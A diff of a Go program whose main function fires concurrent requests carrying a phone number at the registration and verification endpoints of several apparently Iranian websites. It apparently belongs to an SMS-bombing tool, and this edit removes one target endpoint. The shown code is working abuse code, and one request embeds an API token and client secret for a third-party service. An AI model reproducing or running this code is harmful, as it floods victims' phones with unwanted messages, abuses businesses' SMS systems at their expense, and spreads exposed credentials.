@@ -426,9 +426,6 @@ func main() {
 		go sms("https://restaurant.delino.com/user/register", map[string]interface{}{
 			"'apiToken':'VyG4uxayCdv5hNFKmaTeMJzw3F95sS9DVMXzMgvzgXrdyxHJGFcranHS2mECTWgq','clientSecret':'7eVdaVsYXUZ2qwA9yAu7QBSH2dFSCMwq','device':'web','username'": phone,
 		}, ch)
-		go sms("https://1401api.tamland.ir/api/user/signup", map[string]interface{}{
-			"Mobile": phone,
-		}, ch)
 		go sms("https://melix.shop/site/api/v1/user/validate", map[string]interface{}{
 			"mobile": phone,
 		}, ch)    // edit :4/22/2025
